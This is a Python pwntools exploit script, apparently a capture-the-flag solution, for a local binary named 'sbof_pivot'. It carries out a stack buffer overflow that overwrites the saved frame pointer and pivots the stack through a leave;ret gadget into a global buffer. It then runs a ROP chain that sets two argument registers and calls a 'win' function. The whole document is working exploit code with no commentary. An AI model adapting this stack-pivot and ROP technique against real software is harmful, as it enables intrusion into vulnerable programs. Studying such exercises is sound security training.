#!/usr/bin/env python3
from pwn import *

binf_file = './sbof_pivot'
context(os='linux', arch='amd64')

binf = ELF( binf_file )

def attack(proc, **kwargs):
	
	rop = ROP(binf)
	
	ropch = b''
	ropch += b'A' * 8	# name
	ropch += b'B' * 8	# name
	ropch += p64(binf.symbols['msg'] + 0xC0 - 8)	# Saved RBP
	ropch += p64(rop.leave.address)		# leave; ret;
	
	info( proc.sendafter(b'>>', ropch[:-1]).decode() )
	
	ropch = b''
	ropch += b'A' * 0xC0
	ropch += p64( rop.rdi.address )
	ropch += p64( 0xcafebabe )
	ropch += p64( rop.rsi.address )
	ropch += p64( 0xc0bebeef )
	ropch += p64( 0xdeadbeef )
	ropch += p64( binf.functions['win'].address )
	
	info( proc.sendlineafter(b'>>', ropch).decode() )
	info( proc.recvall().decode() )

def main():
	proc = process(binf_file)
	attack(proc)

if __name__ == '__main__':
	main()
